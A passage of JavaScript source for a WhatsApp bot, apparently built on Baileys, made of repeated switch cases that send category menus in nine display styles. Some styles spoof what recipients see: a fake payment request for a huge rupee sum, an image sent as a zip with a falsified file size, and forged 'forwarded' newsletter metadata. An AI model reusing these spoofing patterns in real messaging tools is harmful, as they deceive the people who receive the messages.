thumbnailUrl: "https://i.ibb.co/svNLtkqf/20250128-021109.jpg",
sourceUrl: websitex,
mediaType: 1,
renderLargerThumbnail: true
}
}
}, {
quoted: m
})
}
}
break
case 'othermenu': {
let xmenu_oh = `Hi user ${pushname}\n${othermenu(prefix, hituet)}`
if (typemenu === 'v1') {
                    EliteProEmpire.sendMessage(m.chat, {
                        image: fs.readFileSync('./EliteProMedia/theme/elitepro.jpg'),
                        caption: xmenu_oh
                    }, {
                        quoted: m
                    })
                } else if (typemenu === 'v2') {
                    EliteProEmpire.sendMessage(m.chat, {
                        text: xmenu_oh,
                        contextInfo: {
                            externalAdReply: {
                                showAdAttribution: true,
                                title: botname,
                                body: ownername,
                                thumbnail: fs.readFileSync('./EliteProMedia/theme/elitepro.jpg'),
                                sourceUrl: wagc,
                                mediaType: 1,
                                renderLargerThumbnail: true
                            }
                        }
                    }, {
                        quoted: m
                    })
                }   if (typemenu === 'v3') {
                    EliteProEmpire.sendMessage(m.chat, {
                        video: fs.readFileSync('./EliteProMedia/theme/Elite-Pro.mp4'),
                        caption: xmenu_oh
                    }, {
                        quoted: m
                    })
                } else if (typemenu === 'v4') {
                    EliteProEmpire.sendMessage(m.chat, {
                        video: fs.readFileSync('./EliteProMedia/theme/Elite-Pro.mp4'),
                        caption: xmenu_oh,
                        gifPlayback: true
                    }, {
                        quoted: m
                    })
                } else if (typemenu === 'v5') {
                    EliteProEmpire.relayMessage(m.chat, {
                        scheduledCallCreationMessage: {
                            callType: "AUDIO",
                            scheduledTimestampMs: 1200,
                            title: xmenu_oh
                        }
                    }, {})
                } else if (typemenu === 'v6') {
                    EliteProEmpire.relayMessage(m.chat,  {
                       requestPaymentMessage: {
                          currencyCodeIso4217: 'INR',
                          amount1000: '9999999900',
                          requestFrom: m.sender,
                          noteMessage: {
                             extendedTextMessage: {
                                text: xmenu_oh,
                                contextInfo: {
                                   externalAdReply: {
                                       showAdAttribution: true
                                   }
                                }
                             }
                          }
                       }
                    }, {})
                } else if (typemenu === 'v7') {
                    EliteProEmpire.sendMessage(m.chat, {
                        document: {
                           url: 'https://i.ibb.co/2W0H9Jq/avatar-contact.png'
                        },
                        caption: xmenu_oh,
                        mimetype: 'application/zip',
                        fileName: ownername,
                        fileLength: "99999999999",
                        contextInfo: {
                            externalAdReply: {
                                showAdAttribution: true,
                                title: botname,
                                body: ownername,
                                thumbnail: fs.readFileSync('./EliteProMedia/theme/elitepro.jpg'),
                                sourceUrl: wagc,
                                mediaType: 1,
                                renderLargerThumbnail: true
                            }
                        }
                    }, {
                        quoted: fstatus 
                    })
                } else if (typemenu === 'v8') {
                	EliteProEmpire.sendMessage(m.chat, {
      video: fs.readFileSync('./EliteProMedia/theme/Elite-Pro.mp4'),
      gifPlayback: true,
      caption: xmenu_oh,
      contextInfo: {
      externalAdReply: {
      title: botname,
      body: ownername,
      thumbnailUrl: 'https://i.ibb.co/svNLtkqf/20250128-021109.jpg',
      sourceUrl: ``,
      mediaType: 1,
      renderLargerThumbnail: true
      }
      }
      }, {
                        quoted: m
                    })
                    } else if (typemenu === 'v9') {
                	EliteProEmpire.sendMessage(m.chat, {
video: fs.readFileSync('./EliteProMedia/theme/Elite-Pro.mp4'),
caption: xmenu_oh,
gifPlayback: true,
contextInfo: {
forwardingScore: 999,
isForwarded: true,
mentionedJid: [sender],
forwardedNewsletterMessageInfo: {
newsletterName: ownername,
newsletterJid: "120363287352245413@newsletter",
},
externalAdReply: {
showAdAttribution: true,
title: ownername,
body: botname,
thumbnailUrl: "https://i.ibb.co/svNLtkqf/20250128-021109.jpg",
sourceUrl: websitex,
mediaType: 1,
renderLargerThumbnail: true
}
}
}, {
quoted: m
})
} 
}
break
case 'downloadmenu': {
let xmenu_oh = `Hi user ${pushname}\n${downloadmenu(prefix, hituet)}`
if (typemenu === 'v1') {
                    EliteProEmpire.sendMessage(m.chat, {
                        image: fs.readFileSync('./EliteProMedia/theme/elitepro.jpg'),
                        caption: xmenu_oh
                    }, {
                        quoted: m
                    })
                } else if (typemenu === 'v2') {
                    EliteProEmpire.sendMessage(m.chat, {
                        text: xmenu_oh,
                        contextInfo: {
                            externalAdReply: {
                                showAdAttribution: true,
                                title: botname,
                                body: ownername,
                                thumbnail: fs.readFileSync('./EliteProMedia/theme/elitepro.jpg'),
                                sourceUrl: wagc,
                                mediaType: 1,
                                renderLargerThumbnail: true
                            }
                        }
                    }, {
                        quoted: m
                    })
                }   if (typemenu === 'v3') {
                    EliteProEmpire.sendMessage(m.chat, {
                        video: fs.readFileSync('./EliteProMedia/theme/Elite-Pro.mp4'),
                        caption: xmenu_oh
                    }, {
                        quoted: m
                    })
                } else if (typemenu === 'v4') {
                    EliteProEmpire.sendMessage(m.chat, {
                        video: fs.readFileSync('./EliteProMedia/theme/Elite-Pro.mp4'),
                        caption: xmenu_oh,
                        gifPlayback: true
                    }, {
                        quoted: m
                    })
                } else if (typemenu === 'v5') {
                    EliteProEmpire.relayMessage(m.chat, {
                        scheduledCallCreationMessage: {
                            callType: "AUDIO",
                            scheduledTimestampMs: 1200,
                            title: xmenu_oh
                        }
                    }, {})
                } else if (typemenu === 'v6') {
                    EliteProEmpire.relayMessage(m.chat,  {
                       requestPaymentMessage: {
                          currencyCodeIso4217: 'INR',
                          amount1000: '9999999900',
                          requestFrom: m.sender,
                          noteMessage: {
                             extendedTextMessage: {
                                text: xmenu_oh,
                                contextInfo: {
                                   externalAdReply: {
                                       showAdAttribution: true
                                   }
                                }
                             }
                          }
                       }
                    }, {})
                } else if (typemenu === 'v7') {
                    EliteProEmpire.sendMessage(m.chat, {
                        document: {
                           url: 'https://i.ibb.co/2W0H9Jq/avatar-contact.png'
                        },
                        caption: xmenu_oh,
                        mimetype: 'application/zip',
                        fileName: ownername,
                        fileLength: "99999999999",
                        contextInfo: {
                            externalAdReply: {
                                showAdAttribution: true,
                                title: botname,
                                body: ownername,
                                thumbnail: fs.readFileSync('./EliteProMedia/theme/elitepro.jpg'),
                                sourceUrl: wagc,
                                mediaType: 1,
                                renderLargerThumbnail: true
                            }
                        }
                    }, {
                        quoted: fstatus 
                    })
                } else if (typemenu === 'v8') {
                	EliteProEmpire.sendMessage(m.chat, {
      video: fs.readFileSync('./EliteProMedia/theme/Elite-Pro.mp4'),
      gifPlayback: true,
      caption: xmenu_oh,
      contextInfo: {
      externalAdReply: {
      title: botname,
      body: ownername,
      thumbnailUrl: 'https://i.ibb.co/svNLtkqf/20250128-021109.jpg',
      sourceUrl: ``,
      mediaType: 1,
      renderLargerThumbnail: true
      }
      }
      }, {
                        quoted: m
                    })
                    } else if (typemenu === 'v9') {
                	EliteProEmpire.sendMessage(m.chat, {
video: fs.readFileSync('./EliteProMedia/theme/Elite-Pro.mp4'),
caption: xmenu_oh,
gifPlayback: true,
contextInfo: {
forwardingScore: 999,
isForwarded: true,
mentionedJid: [sender],
forwardedNewsletterMessageInfo: {
newsletterName: ownername,
newsletterJid: "120363287352245413@newsletter",
},
externalAdReply: {
showAdAttribution: true,
title: ownername,
body: botname,
thumbnailUrl: "https://i.ibb.co/svNLtkqf/20250128-021109.jpg",
sourceUrl: websitex,
mediaType: 1,
renderLargerThumbnail: true
}
}
}, {
quoted: m
})
} 
}
break
case 'groupmenu': {
let xmenu_oh = `Hi user ${pushname}\n${groupmenu(prefix, hituet)}`
if (typemenu === 'v1') {
                    EliteProEmpire.sendMessage(m.chat, {
                        image: fs.readFileSync('./EliteProMedia/theme/elitepro.jpg'),
                        caption: xmenu_oh
                    }, {
                        quoted: m
                    })
                } else if (typemenu === 'v2') {
                    EliteProEmpire.sendMessage(m.chat, {
                        text: xmenu_oh,
                        contextInfo: {
                            externalAdReply: {
                                showAdAttribution: true,
                                title: botname,
                                body: ownername,
                                thumbnail: fs.readFileSync('./EliteProMedia/theme/elitepro.jpg'),
                                sourceUrl: wagc,
                                mediaType: 1,
                                renderLargerThumbnail: true
                            }
                        }
                    }, {
                        quoted: m
                    })
                }   if (typemenu === 'v3') {
                    EliteProEmpire.sendMessage(m.chat, {
                        video: fs.readFileSync('./EliteProMedia/theme/Elite-Pro.mp4'),
                        caption: xmenu_oh
                    }, {
                        quoted: m
                    })
                } else if (typemenu === 'v4') {
                    EliteProEmpire.sendMessage(m.chat, {
                        video: fs.readFileSync('./EliteProMedia/theme/Elite-Pro.mp4'),
                        caption: xmenu_oh,
                        gifPlayback: true
                    }, {
                        quoted: m
                    })
                } else if (typemenu === 'v5') {
                    EliteProEmpire.relayMessage(m.chat, {
                        scheduledCallCreationMessage: {
                            callType: "AUDIO",
                            scheduledTimestampMs: 1200,
                            title: xmenu_oh
                        }
                    }, {})
                } else if (typemenu === 'v6') {
                    EliteProEmpire.relayMessage(m.chat,  {
                       requestPaymentMessage: {
                          currencyCodeIso4217: 'INR',
                          amount1000: '9999999900',
                          requestFrom: m.sender,
                          noteMessage: {
                             extendedTextMessage: {
                                text: xmenu_oh,
                                contextInfo: {
                                   externalAdReply: {
                                       showAdAttribution: true
                                   }
                                }
                             }
                          }
                       }
                    }, {})
                } else if (typemenu === 'v7') {
                    EliteProEmpire.sendMessage(m.chat, {
                        document: {
                           url: 'https://i.ibb.co/2W0H9Jq/avatar-contact.png'
                        },
                        caption: xmenu_oh,
                        mimetype: 'application/zip',
                        fileName: ownername,
                        fileLength: "99999999999",
                        contextInfo: {
                            externalAdReply: {
                                showAdAttribution: true,
                                title: botname,
                                body: ownername,
                                thumbnail: fs.readFileSync('./EliteProMedia/theme/elitepro.jpg'),
                                sourceUrl: wagc,
                                mediaType: 1,
                                renderLargerThumbnail: true
                            }
                        }
                    }, {
                        quoted: fstatus 
                    })
                } else if (typemenu === 'v8') {
                	EliteProEmpire.sendMessage(m.chat, {
      video: fs.readFileSync('./EliteProMedia/theme/Elite-Pro.mp4'),
      gifPlayback: true,
      caption: xmenu_oh,
      contextInfo: {
      externalAdReply: {
      title: botname,
      body: ownername,
      thumbnailUrl: 'https://i.ibb.co/svNLtkqf/20250128-021109.jpg',
      sourceUrl: ``,
      mediaType: 1,
      renderLargerThumbnail: true
      }
      }
      }, {
                        quoted: m
                    })
                    } else if (typemenu === 'v9') {
                	EliteProEmpire.sendMessage(m.chat, {
video: fs.readFileSync('./EliteProMedia/theme/Elite-Pro.mp4'),
caption: xmenu_oh,
gifPlayback: true,
contextInfo: {
forwardingScore: 999,
isForwarded: true,
mentionedJid: [sender],
forwardedNewsletterMessageInfo: {
newsletterName: ownername,
newsletterJid: "120363287352245413@newsletter",
},
externalAdReply: {
showAdAttribution: true,
title: ownername,
body: botname,
thumbnailUrl: "https://i.ibb.co/svNLtkqf/20250128-021109.jpg",
sourceUrl: websitex,
mediaType: 1,
renderLargerThumbnail: true
}
}
}, {
quoted: m
})
} 
}
break
case 'gamemenu': {
let xmenu_oh = `Hi user ${pushname}\n${gamemenu(prefix, hituet)}`
if (typemenu === 'v1') {
                    EliteProEmpire.sendMessage(m.chat, {
                        image: fs.readFileSync('./EliteProMedia/theme/elitepro.jpg'),
                        caption: xmenu_oh
                    }, {
                        quoted: m
                    })
                } else if (typemenu === 'v2') {
                    EliteProEmpire.sendMessage(m.chat, {
                        text: xmenu_oh,
                        contextInfo: {
                            externalAdReply: {
                                showAdAttribution: true,
                                title: botname,
                                body: ownername,
                                thumbnail: fs.readFileSync('./EliteProMedia/theme/elitepro.jpg'),
                                sourceUrl: wagc,
                                mediaType: 1,
                                renderLargerThumbnail: true
                            }
                        }
                    }, {
                        quoted: m
                    })
                }   if (typemenu === 'v3') {
                    EliteProEmpire.sendMessage(m.chat, {
                        video: fs.readFileSync('./EliteProMedia/theme/Elite-Pro.mp4'),
                        caption: xmenu_oh
                    }, {
                        quoted: m
                    })
                } else if (typemenu === 'v4') {
                    EliteProEmpire.sendMessage(m.chat, {
                        video: fs.readFileSync('./EliteProMedia/theme/Elite-Pro.mp4'),
                        caption: xmenu_oh,
                        gifPlayback: true
                    }, {
                        quoted: m
                    })
                } else if (typemenu === 'v5') {
                    EliteProEmpire.relayMessage(m.chat, {
                        scheduledCallCreationMessage: {
                            callType: "AUDIO",
                            scheduledTimestampMs: 1200,
                            title: xmenu_oh
                        }
                    }, {})
                } else if (typemenu === 'v6') {
                    EliteProEmpire.relayMessage(m.chat,  {
                       requestPaymentMessage: {
                          currencyCodeIso4217: 'INR',
                          amount1000: '9999999900',
                          requestFrom: m.sender,
                          noteMessage: {
                             extendedTextMessage: {
                                text: xmenu_oh,
                                contextInfo: {
                                   externalAdReply: {
                                       showAdAttribution: true
                                   }
                                }
                             }
                          }
                       }
                    }, {})
                } else if (typemenu === 'v7') {
                    EliteProEmpire.sendMessage(m.chat, {
                        document: {
                           url: 'https://i.ibb.co/2W0H9Jq/avatar-contact.png'
                        },
                        caption: xmenu_oh,
                        mimetype: 'application/zip',
                        fileName: ownername,
                        fileLength: "99999999999",
                        contextInfo: {
                            externalAdReply: {
                                showAdAttribution: true,
                                title: botname,
                                body: ownername,
                                thumbnail: fs.readFileSync('./EliteProMedia/theme/elitepro.jpg'),
                                sourceUrl: wagc,
                                mediaType: 1,
                                renderLargerThumbnail: true
                            }
                        }
                    }, {
                        quoted: fstatus 
                    })
                } else if (typemenu === 'v8') {
                	EliteProEmpire.sendMessage(m.chat, {
      video: fs.readFileSync('./EliteProMedia/theme/Elite-Pro.mp4'),
      gifPlayback: true,
      caption: xmenu_oh,
      contextInfo: {
      externalAdReply: {
      title: botname,
      body: ownername,
      thumbnailUrl: 'https://i.ibb.co/svNLtkqf/20250128-021109.jpg',
      sourceUrl: ``,
      mediaType: 1,
      renderLargerThumbnail: true
      }
      }
      }, {
                        quoted: m
                    })
                    } else if (typemenu === 'v9') {
                	EliteProEmpire.sendMessage(m.chat, {
video: fs.readFileSync('./EliteProMedia/theme/Elite-Pro.mp4'),
caption: xmenu_oh,
gifPlayback: true,
contextInfo: {
forwardingScore: 999,
isForwarded: true,
mentionedJid: [sender],
forwardedNewsletterMessageInfo: {
newsletterName: ownername,
newsletterJid: "120363287352245413@newsletter",
},
externalAdReply: {
showAdAttribution: true,
title: ownername,
body: botname,
thumbnailUrl: "https://i.ibb.co/svNLtkqf/20250128-021109.jpg",
sourceUrl: websitex,
mediaType: 1,
renderLargerThumbnail: true
}
}
}, {
quoted: m
})
} 
}
break
case 'funmenu': {
let xmenu_oh = `Hi user ${pushname}\n${funmenu(prefix, hituet)}`
if (typemenu === 'v1') {
                    EliteProEmpire.sendMessage(m.chat, {
                        image: fs.readFileSync('./EliteProMedia/theme/elitepro.jpg'),
                        caption: xmenu_oh
                    }, {
                        quoted: m
                    })
                } else if (typemenu === 'v2') {
                    EliteProEmpire.sendMessage(m.chat, {
                        text: xmenu_oh,
                        contextInfo: {
                            externalAdReply: {
                                showAdAttribution: true,
                                title: botname,
                                body: ownername,
                                thumbnail: fs.readFileSync('./EliteProMedia/theme/elitepro.jpg'),
                                sourceUrl: wagc,
                                mediaType: 1,
                                renderLargerThumbnail: true
                            }
                        }
                    }, {
                        quoted: m
                    })
                }   if (typemenu === 'v3') {
                    EliteProEmpire.sendMessage(m.chat, {
                        video: fs.readFileSync('./EliteProMedia/theme/Elite-Pro.mp4'),
                        caption: xmenu_oh
                    }, {
                        quoted: m
                    })
                } else if (typemenu === 'v4') {
                    EliteProEmpire.sendMessage(m.chat, {
                        video: fs.readFileSync('./EliteProMedia/theme/Elite-Pro.mp4'),
                        caption: xmenu_oh,
                        gifPlayback: true
                    }, {
                        quoted: m
                    })
                } else if (typemenu === 'v5') {
                    EliteProEmpire.relayMessage(m.chat, {
                        scheduledCallCreationMessage: {
                            callType: "AUDIO",
                            scheduledTimestampMs: 1200,
                            title: xmenu_oh
                        }
                    }, {})
                } else if (typemenu === 'v6') {
                    EliteProEmpire.relayMessage(m.chat,  {
                       requestPaymentMessage: {
                          currencyCodeIso4217: 'INR',
                          amount1000: '9999999900',
                          requestFrom: m.sender,
                          noteMessage: {
                             extendedTextMessage: {
                                text: xmenu_oh,
                                contextInfo: {
                                   externalAdReply: {
                                       showAdAttribution: true
                                   }
                                }
                             }
                          }
                       }
                    }, {})
                } else if (typemenu === 'v7') {
                    EliteProEmpire.sendMessage(m.chat, {
                        document: {
                           url: 'https://i.ibb.co/2W0H9Jq/avatar-contact.png'
                        },
                        caption: xmenu_oh,
                        mimetype: 'application/zip',
                        fileName: ownername,
                        fileLength: "99999999999",
                        contextInfo: {
                            externalAdReply: {
                                showAdAttribution: true,
                                title: botname,
                                body: ownername,
                                thumbnail: fs.readFileSync('./EliteProMedia/theme/elitepro.jpg'),
                                sourceUrl: wagc,
                                mediaType: 1,
                                renderLargerThumbnail: true
                            }
                        }
                    }, {
                        quoted: fstatus 
                    })
                } else if (typemenu === 'v8') {
                	EliteProEmpire.sendMessage(m.chat, {
      video: fs.readFileSync('./EliteProMedia/theme/Elite-Pro.mp4'),
      gifPlayback: true,
      caption: xmenu_oh,
      contextInfo: {
      externalAdReply: {
      title: botname,
      body: ownername,
      thumbnailUrl: 'https://i.ibb.co/svNLtkqf/20250128-021109.jpg',
      sourceUrl: ``,
      mediaType: 1,
      renderLargerThumbnail: true
      }
      }
      }, {
                        quoted: m
                    })
                    } else if (typemenu === 'v9') {
                	EliteProEmpire.sendMessage(m.chat, {
video: fs.readFileSync('./EliteProMedia/theme/Elite-Pro.mp4'),
caption: xmenu_oh,
gifPlayback: true,
contextInfo: {
forwardingScore: 999,
isForwarded: true,
mentionedJid: [sender],
forwardedNewsletterMessageInfo: {
newsletterName: ownername,
newsletterJid: "120363287352245413@newsletter",
},
externalAdReply: {
showAdAttribution: true,
title: ownername,
body: botname,
thumbnailUrl: "https://i.ibb.co/svNLtkqf/20250128-021109.jpg",
sourceUrl: websitex,
mediaType: 1,
renderLargerThumbnail: true
}
}
}, {
quoted: m
})
} 
}
break
case 'stalkermenu': {
let xmenu_oh = `Hi user ${pushname}\n${stalkermenu(prefix, hituet)}`
if (typemenu === 'v1') {
                    EliteProEmpire.sendMessage(m.chat, {
                        image: fs.readFileSync('./EliteProMedia/theme/elitepro.jpg'),
                        caption: xmenu_oh
                    }, {
                        quoted: m
                    })
                } else if (typemenu === 'v2') {
                    EliteProEmpire.sendMessage(m.chat, {
                        text: xmenu_oh,
                        contextInfo: {
                            externalAdReply: {
                                showAdAttribution: true,
                                title: botname,
                                body: ownername,
                                thumbnail: fs.readFileSync('./EliteProMedia/theme/elitepro.jpg'),
                                sourceUrl: wagc,
                                mediaType: 1,
                                renderLargerThumbnail: true
                            }
                        }
                    }, {
                        quoted: m
                    })
                }   if (typemenu === 'v3') {
                    EliteProEmpire.sendMessage(m.chat, {
                        video: fs.readFileSync('./EliteProMedia/theme/Elite-Pro.mp4'),
                        caption: xmenu_oh
                    }, {
                        quoted: m
                    })
                } else if (typemenu === 'v4') {
                    EliteProEmpire.sendMessage(m.chat, {
                        video: fs.readFileSync('./EliteProMedia/theme/Elite-Pro.mp4'),
                        caption: xmenu_oh,
                        gifPlayback: true
                    }, {
                        quoted: m
                    })
                } else if (typemenu === 'v5') {
                    EliteProEmpire.relayMessage(m.chat, {
                        scheduledCallCreationMessage: {
                            callType: "AUDIO",
                            scheduledTimestampMs: 1200,
                            title: xmenu_oh
                        }
                    }, {})
                } else if (typemenu === 'v6') {
                    EliteProEmpire.relayMessage(m.chat,  {
                       requestPaymentMessage: {
                          currencyCodeIso4217: 'INR',
                          amount1000: '9999999900',
                          requestFrom: m.sender,
                          noteMessage: {
                             extendedTextMessage: {
                                text: xmenu_oh,
                                contextInfo: {
                                   externalAdReply: {
                                       showAdAttribution: true
                                   }
                                }
                             }
                          }
                       }
                    }, {})
                } else if (typemenu === 'v7') {
                    EliteProEmpire.sendMessage(m.chat, {
                        document: {
                           url: 'https://i.ibb.co/2W0H9Jq/avatar-contact.png'
                        },
                        caption: xmenu_oh,
                        mimetype: 'application/zip',
                        fileName: ownername,
                        fileLength: "99999999999",
                        contextInfo: {
                            externalAdReply: {
                                showAdAttribution: true,
                                title: botname,
                                body: ownername,
                                thumbnail: fs.readFileSync('./EliteProMedia/theme/elitepro.jpg'),
                                sourceUrl: wagc,
                                mediaType: 1,
                                renderLargerThumbnail: true
                            }
                        }
                    }, {
                        quoted: fstatus 
                    })
                } else if (typemenu === 'v8') {
                	EliteProEmpire.sendMessage(m.chat, {
      video: fs.readFileSync('./EliteProMedia/theme/Elite-Pro.mp4'),
      gifPlayback: true,
      caption: xmenu_oh,
      contextInfo: {
      externalAdReply: {
      title: botname,
      body: ownername,
      thumbnailUrl: 'https://i.ibb.co/svNLtkqf/20250128-021109.jpg',
      sourceUrl: ``,
      mediaType: 1,
      renderLargerThumbnail: true
      }
      }
      }, {
                        quoted: m
                    })
                    } else if (typemenu === 'v9') {
                	EliteProEmpire.sendMessage(m.chat, {
video: fs.readFileSync('./EliteProMedia/theme/Elite-Pro.mp4'),
caption: xmenu_oh,
gifPlayback: true,
contextInfo: {
forwardingScore: 999,
isForwarded: true,
mentionedJid: [sender],
forwardedNewsletterMessageInfo: {
newsletterName: ownername,
newsletterJid: "120363287352245413@newsletter",
},
externalAdReply: {
showAdAttribution: true,
title: ownername,
body: botname,
thumbnailUrl: "https://i.ibb.co/svNLtkqf/20250128-021109.jpg",
sourceUrl: websitex,
mediaType: 1,
renderLargerThumbnail: true
}
}
}, {
quoted: m
})
} 
}
break
case 'randomphotomenu': {
let xmenu_oh = `Hi user ${pushname}\n${randphotomenu(prefix, hituet)}`
if (typemenu === 'v1') {
                    EliteProEmpire.sendMessage(m.chat, {
                        image: fs.readFileSync('./EliteProMedia/theme/elitepro.jpg'),
                        caption: xmenu_oh
                    }, {
                        quoted: m
                    })
                } else if (typemenu === 'v2') {
                    EliteProEmpire.sendMessage(m.chat, {
                        text: xmenu_oh,
                        contextInfo: {
                            externalAdReply: {
                                showAdAttribution: true,
                                title: botname,
                                body: ownername,
                                thumbnail: fs.readFileSync('./EliteProMedia/theme/elitepro.jpg'),
                                sourceUrl: wagc,
                                mediaType: 1,
                                renderLargerThumbnail: true
                            }
                        }
                    }, {
                        quoted: m
                    })
                }   if (typemenu === 'v3') {
                    EliteProEmpire.sendMessage(m.chat, {
                        video: fs.readFileSync('./EliteProMedia/theme/Elite-Pro.mp4'),
                        caption: xmenu_oh
                    }, {
                        quoted: m
                    })
                } else if (typemenu === 'v4') {
                    EliteProEmpire.sendMessage(m.chat, {
                        video: fs.readFileSync('./EliteProMedia/theme/Elite-Pro.mp4'),
                        caption: xmenu_oh,
                        gifPlayback: true
                    }, {
                        quoted: m
                    })
                } else if (typemenu === 'v5') {
                    EliteProEmpire.relayMessage(m.chat, {
                        scheduledCallCreationMessage: {
                            callType: "AUDIO",
                            scheduledTimestampMs: 1200,
                            title: xmenu_oh
                        }
                    }, {})
                } else if (typemenu === 'v6') {
                    EliteProEmpire.relayMessage(m.chat,  {
                       requestPaymentMessage: {
                          currencyCodeIso4217: 'INR',
                          amount1000: '9999999900',
                          requestFrom: m.sender,
                          noteMessage: {
                             extendedTextMessage: {
                                text: xmenu_oh,
                                contextInfo: {
                                   externalAdReply: {
                                       showAdAttribution: true
                                   }
                                }
                             }
                          }
                       }
                    }, {})
                } else if (typemenu === 'v7') {
                    EliteProEmpire.sendMessage(m.chat, {
                        document: {
                           url: 'https://i.ibb.co/2W0H9Jq/avatar-contact.png'
                        },
                        caption: xmenu_oh,
                        mimetype: 'application/zip',
                        fileName: ownername,
                        fileLength: "99999999999",
                        contextInfo: {
                            externalAdReply: {
                                showAdAttribution: true,
                                title: botname,
                                body: ownername,
                                thumbnail: fs.readFileSync('./EliteProMedia/theme/elitepro.jpg'),
                                sourceUrl: wagc,
                                mediaType: 1,
                                renderLargerThumbnail: true
                            }
                        }
                    }, {
                        quoted: fstatus 
                    })
                } else if (typemenu === 'v8') {
                	EliteProEmpire.sendMessage(m.chat, {
      video: fs.readFileSync('./EliteProMedia/theme/Elite-Pro.mp4'),
      gifPlayback: true,
      caption: xmenu_oh,
      contextInfo: {
      externalAdReply: {
      title: botname,
      body: ownername,
      thumbnailUrl: 'https://i.ibb.co/svNLtkqf/20250128-021109.jpg',
      sourceUrl: ``,
      mediaType: 1,
      renderLargerThumbnail: true
      }
      }
      }, {
                        quoted: m
                    })
                    } else if (typemenu === 'v9') {
                	EliteProEmpire.sendMessage(m.chat, {
video: fs.readFileSync('./EliteProMedia/theme/Elite-Pro.mp4'),
caption: xmenu_oh,
gifPlayback: true,
contextInfo: {
forwardingScore: 999,
isForwarded: true,
mentionedJid: [sender],
forwardedNewsletterMessageInfo: {
newsletterName: ownername,
newsletterJid: "120363287352245413@newsletter",
},
externalAdReply: {
showAdAttribution: true,
title: ownername,
body: botname,
thumbnailUrl: "https://i.ibb.co/svNLtkqf/20250128-021109.jpg",
sourceUrl: websitex,
mediaType: 1,
renderLargerThumbnail: true
}
}
}, {
quoted: m
})
} 
}
break
case 'randomvideomenu': {
let xmenu_oh = `Hi user ${pushname}\n${randvideomenu(prefix, hituet)}`
if (typemenu === 'v1') {
                    EliteProEmpire.sendMessage(m.chat, {
                        image: fs.readFileSync('./EliteProMedia/theme/elitepro.jpg'),
                        caption: xmenu_oh
                    }, {
                        quoted: m
                    })
                } else if (typemenu === 'v2') {
                    EliteProEmpire.sendMessage(m.chat, {
                        text: xmenu_oh,
                        contextInfo: {
                            externalAdReply: {
                                showAdAttribution: true,
                                title: botname,
                                body: ownername,
                                thumbnail: fs.readFileSync('./EliteProMedia/theme/elitepro.jpg'),
                                sourceUrl: wagc,
                                mediaType: 1,
                                renderLargerThumbnail: true
                            }
                        }
                    }, {
                        quoted: m
                    })
                }   if (typemenu === 'v3') {
                    EliteProEmpire.sendMessage(m.chat, {
                        video: fs.readFileSync('./EliteProMedia/theme/Elite-Pro.mp4'),
                        caption: xmenu_oh
                    }, {
                        quoted: m
                    })
                } else if (typemenu === 'v4') {
                    EliteProEmpire.sendMessage(m.chat, {
                        video: fs.readFileSync('./EliteProMedia/theme/Elite-Pro.mp4'),
                        caption: xmenu_oh,
                        gifPlayback: true
                    }, {
                        quoted: m
                    })
                } else if (typemenu === 'v5') {
                    EliteProEmpire.relayMessage(m.chat, {
                        scheduledCallCreationMessage: {
                            callType: "AUDIO",
                            scheduledTimestampMs: 1200,
                            title: xmenu_oh
                        }
                    }, {})
                } else if (typemenu === 'v6') {
                    EliteProEmpire.relayMessage(m.chat,  {
                       requestPaymentMessage: {
                          currencyCodeIso4217: 'INR',
                          amount1000: '9999999900',
                          requestFrom: m.sender,
                          noteMessage: {
                             extendedTextMessage: {
                                text: xmenu_oh,
                                contextInfo: {
                                   externalAdReply: {
                                       showAdAttribution: true
                                   }
                                }
                             }
                          }
                       }
                    }, {})
                } else if (typemenu === 'v7') {
                    EliteProEmpire.sendMessage(m.chat, {
                        document: {
                           url: 'https://i.ibb.co/2W0H9Jq/avatar-contact.png'
                        },
                        caption: xmenu_oh,
                        mimetype: 'application/zip',
                        fileName: ownername,
                        fileLength: "99999999999",
                        contextInfo: {
                            externalAdReply: {
                                showAdAttribution: true,
                                title: botname,
                                body: ownername,
                                thumbnail: fs.readFileSync('./EliteProMedia/theme/elitepro.jpg'),
                                sourceUrl: wagc,
                                mediaType: 1,
                                renderLargerThumbnail: true
                            }
                        }
                    }, {
                        quoted: fstatus 
                    })
                } else if (typemenu === 'v8') {
                	EliteProEmpire.sendMessage(m.chat, {
      video: fs.readFileSync('./EliteProMedia/theme/Elite-Pro.mp4'),
      gifPlayback: true,
      caption: xmenu_oh,
      contextInfo: {
      externalAdReply: {
      title: botname,
      body: ownername,
      thumbnailUrl: 'https://i.ibb.co/svNLtkqf/20250128-021109.jpg',
      sourceUrl: ``,
      mediaType: 1,
      renderLargerThumbnail: true
      }
      }
      }, {
                        quoted: m
                    })
                    } else if (typemenu === 'v9') {
                	EliteProEmpire.sendMessage(m.chat, {
video: fs.readFileSync('./EliteProMedia/theme/Elite-Pro.mp4'),
caption: xmenu_oh,
gifPlayback: true,
contextInfo: {
forwardingScore: 999,
isForwarded: true,
mentionedJid: [sender],
forwardedNewsletterMessageInfo: {
newsletterName: ownername,
newsletterJid: "120363287352245413@newsletter",
},
externalAdReply: {
showAdAttribution: true,
title: ownername,
body: botname,
thumbnailUrl: "https://i.ibb.co/svNLtkqf/20250128-021109.jpg",
sourceUrl: websitex,
mediaType: 1,
renderLargerThumbnail: true
}
}
}, {
quoted: m
})
} 
}
break
case 'photooxymenu': {
let xmenu_oh = `Hi user ${pushname}\n${photooxymenu(prefix, hituet)}`
if (typemenu === 'v1') {
                    EliteProEmpire.sendMessage(m.chat, {
                        image: fs.readFileSync('./EliteProMedia/theme/elitepro.jpg'),
                        caption: xmenu_oh
                    }, {
                        quoted: m
                    })
                } else if (typemenu === 'v2') {
                    EliteProEmpire.sendMessage(m.chat, {
                        text: xmenu_oh,
                        contextInfo: {
                            externalAdReply: {
                                showAdAttribution: true,
                                title: botname,
                                body: ownername,
                                thumbnail: fs.readFileSync('./EliteProMedia/theme/elitepro.jpg'),
                                sourceUrl: wagc,
                                mediaType: 1,
                                renderLargerThumbnail: true
                            }
                        }
                    }, {
                        quoted: m
                    })
                }   if (typemenu === 'v3') {
                    EliteProEmpire.sendMessage(m.chat, {
                        video: fs.readFileSync('./EliteProMedia/theme/Elite-Pro.mp4'),
                        caption: xmenu_oh
                    }, {
                        quoted: m
                    })
                } else if (typemenu === 'v4') {
                    EliteProEmpire.sendMessage(m.chat, {
                        video: fs.readFileSync('./EliteProMedia/theme/Elite-Pro.mp4'),
                        caption: xmenu_oh,
                        gifPlayback: true
                    }, {
                        quoted: m
                    })
                } else if (typemenu === 'v5') {
                    EliteProEmpire.relayMessage(m.chat, {
                        scheduledCallCreationMessage: {
                            callType: "AUDIO",
